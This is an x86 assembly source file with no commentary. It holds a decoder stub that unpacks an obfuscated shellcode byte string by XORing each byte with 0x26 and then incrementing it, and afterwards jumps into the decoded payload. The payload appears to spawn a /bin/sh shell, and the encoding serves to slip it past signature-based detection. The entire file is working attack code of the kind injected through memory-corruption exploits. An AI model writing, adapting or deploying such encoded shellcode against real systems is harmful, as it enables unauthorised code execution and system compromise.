section .text

global _start

_start:
	jmp short shellcodestr

decode :
	pop esi
	push esi
xored:
	xor byte[esi],0x26
	jz short decr
	inc esi
	jmp short xored

decr:
	pop esi
	push 25
	pop ecx
dec:
	inc byte[esi]
	inc esi
	loop dec

	jmp short shellcode	
	

shellcodestr:
	call decode
	shellcode : db 0x16,0x99,0x69,0x41,0x4b,0x08,0x54,0x41,0x41,0x08,0x08,0x47,0x4e,0xae,0xc4,0x69,0xae,0xc7,0x74,0xae,0xc6,0x89,0x2c,0xea,0x59,0x26,0xff
